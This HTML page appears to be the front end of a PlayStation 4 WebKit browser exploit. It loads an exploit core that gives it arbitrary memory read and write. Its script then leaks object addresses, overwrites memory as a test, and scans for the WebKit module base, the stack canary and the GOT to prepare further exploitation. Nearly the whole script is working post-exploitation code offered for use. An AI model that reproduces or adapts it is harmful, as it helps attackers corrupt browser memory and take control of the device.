
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit RW Primitive</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: #0b0f19;
    color: #c8ced8;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 14px;
    padding: 20px;
  }
  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
  #status {
    font-size: 20px; font-weight: 700; color: #fff;
    min-height: 1.5em;
    text-align: center;
  }
  #log {
    width: 95%; max-width: 1500px; height: 520px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 10px; padding: 14px 16px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 12px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #actions {
    display: flex; gap: 12px; flex-wrap: wrap;
    justify-content: center;
  }
  button {
    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
    border-radius: 12px; color: #fff;
    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .12s ease;
  }
  button:hover { transform: translateY(-2px); }
  button:active { transform: translateY(1px); }
  button:disabled {
    opacity: 0.45; cursor: not-allowed; transform: none;
    background: #374151; box-shadow: none;
  }
</style>
</head>
<body>

<h1>PS4 WebKit Exploit — Slopkit Port</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div id="actions">
  <button id="btnRecon" disabled>Executar Recon</button>
  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
</div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const btnRecon = document.getElementById("btnRecon");

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }

  window.clearLog = function() {
    logBox.innerHTML = "";
  };

  function onCoreEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  function onMemEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  // ========== ELF SCAN ==========
  function findElfBase(p, startAddr, maxScanMB, align) {
    let start = new int64(startAddr.low, startAddr.hi);
    let pages = (maxScanMB * 1024 * 1024) / align;
    for (let i = 0; i < pages; i++) {
      let candidate = start.sub32(i * align);
      try {
        let magic = p.read4(candidate);
        if (magic === 0x464c457f) { // \x7fELF
          return { base: candidate, offset: i * align };
        }
      } catch (e) {}
      if (i % 256 === 0 && i > 0) {
        log(`  scan -0x${(i * align).toString(16)}...`, "info");
      }
    }
    return null;
  }

  // ========== RECONHECIMENTO PS4 ==========
  window.reconPS4 = async function() {
    const p = window.p;
    if (!p) {
      log("window.p não está disponível!", "err");
      return;
    }
    log("=== INICIANDO RECON PS4 ===", "ok");

    try {
      let ua = navigator.userAgent;
      log(`User-Agent: ${ua}`, "info");

      // === MÉTODO 1: __ps5NativeCtor (vazado pelo core.js) ===
      let ctor = null;
      try {
        ctor = globalThis.__ps5NativeCtor;
      } catch (e) {}
      
      if (typeof ctor === "number" && ctor > 0) {
        log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
        
        // Converter para int64
        let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
        log(`Scanning backwards from constructor (0x4000 aligned, 64MB)...`, "info");
        
        let result = findElfBase(p, ctorAddr, 64, 0x4000);
        if (result) {
          log(`ELF found via constructor @ 0x${result.base.toString(16)} (-0x${result.offset.toString(16)})`, "ok");
          await analyzeModule(p, result.base, "WebKit");
        } else {
          log("ELF not found near constructor. Trying 128MB...", "warn");
          result = findElfBase(p, ctorAddr, 128, 0x4000);
          if (result) {
            log(`ELF found via constructor (128MB) @ 0x${result.base.toString(16)}`, "ok");
            await analyzeModule(p, result.base, "WebKit");
          }
        }
      } else {
        log("__ps5NativeCtor not available, falling back to vtable method", "warn");
      }

      // === MÉTODO 2: Vtable (fallback) ===
      if (!window.__webkitBase) {
        log("=== Fallback: Vtable method ===", "info");
        let textarea = document.createElement("textarea");
        let textAddr = p.leakval(textarea);
        let vtablePtr = p.read8(textAddr.add32(0x18));
        let firstEntry = p.read8(vtablePtr);
        log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");

        // Scan backwards from first entry
        let result = findElfBase(p, firstEntry, 64, 0x4000);
        if (!result) result = findElfBase(p, firstEntry, 128, 0x4000);
        if (result) {
          log(`ELF found via vtable @ 0x${result.base.toString(16)}`, "ok");
          await analyzeModule(p, result.base, "WebKit-vtable");
        }
      }

      // === Heap samples ===
      log("Heap sample (5 arrays):", "info");
      for (let i = 0; i < 5; i++) {
        let arr = new Uint8Array(0x100);
        let addr = p.leakval(arr);
        log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
      }

      // === RW sanity ===
      log("Testing read/write...", "info");
      let testBuf = new Uint8Array(8);
      let testAddr = p.leakval(testBuf);
      let original = p.read8(testAddr.add32(0x10));
      p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
      let modified = p.read8(testAddr.add32(0x10));
      p.write8(testAddr.add32(0x10), original);
      log(`  RW test OK: 0x${original.toString(16)} -> 0x${modified.toString(16)}`, "ok");

      log("=== RECON FINALIZADO ===", "ok");
      if (window.__webkitBase) {
        log(`WebKit base confirmed: 0x${window.__webkitBase.toString(16)}`, "ok");
      } else {
        log("Could not find module base automatically.", "err");
      }

    } catch (e) {
      log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
      console.error(e);
    }
  };

  async function analyzeModule(p, base, source) {
    window.__webkitBase = base;
    
    // Dump ELF header
    let eiClass = p.read1(base.add32(4));
    let eiData = p.read1(base.add32(5));
    log(`ELF @ 0x${base.toString(16)} class=${eiClass} data=${eiData} (from ${source})`, "info");

    // Dump first 0x40 bytes
    let hex = "";
    for (let i = 0; i < 0x40; i += 4) {
      hex += p.read4(base.add32(i)).toString(16).padStart(8, '0') + " ";
    }
    log(`ELF header: ${hex}`, "info");

    // Scan for __stack_chk_guard in first 2MB
    log("Scanning for __stack_chk_guard...", "info");
    for (let off = 0; off < 0x200000; off += 8) {
      try {
        let val = p.read8(base.add32(off));
        if (val.hi === 0 && val.low > 0x1000 && (val.low & 0xFF) !== 0) {
          let val2 = p.read8(base.add32(off));
          if (val2.low === val.low && val2.hi === val.hi) {
            log(`  __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "ok");
            window.__stack_chk_guard_off = off;
            break;
          }
        }
      } catch (e) {}
    }

    // Scan for GOT region (cluster of pointers)
    log("Scanning for GOT region...", "info");
    for (let off = 0; off < 0x400000; off += 0x1000) {
      try {
        let count = 0;
        for (let j = 0; j < 0x100; j += 8) {
          let v = p.read8(base.add32(off + j));
          if (v.hi === 0 && v.low > 0x10000000 && v.low < 0x90000000) count++;
        }
        if (count > 8) {
          log(`  Possible GOT @ base+0x${off.toString(16)} (${count} ptrs)`, "info");
          // Dump first few entries
          for (let j = 0; j < 0x40; j += 8) {
            let v = p.read8(base.add32(off + j));
            log(`    [+0x${j.toString(16)}] = 0x${v.toString(16)}`, "info");
          }
          window.__gotOffset = off;
          break;
        }
      } catch (e) {}
    }

    // If we have __ps5NativeCtor, calculate the exact offset
    if (typeof globalThis.__ps5NativeCtor === "number") {
      let ctor = new int64(globalThis.__ps5NativeCtor % 0x100000000, Math.floor(globalThis.__ps5NativeCtor / 0x100000000));
      let delta = ctor.low - base.low;
      if (ctor.hi === base.hi && delta >= 0) {
        log(`Native constructor offset from base: 0x${delta.toString(16)}`, "ok");
        window.__nativeCtorOffset = delta;
      }
    }
  }

  btnRecon.onclick = window.reconPS4;

  // ========== BOOTSTRAP ==========
  log("Carregando módulos...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: onCoreEvent })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas: ${carrier.attempts}`, "info");

      const prim = installWindowP(carrier, {
        onEvent: onMemEvent,
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.int64 = int64;

      status.textContent = "RW Primitivo OK — Pronto para Recon";
      status.style.color = "#4ade80";
      btnRecon.disabled = false;

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${err.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
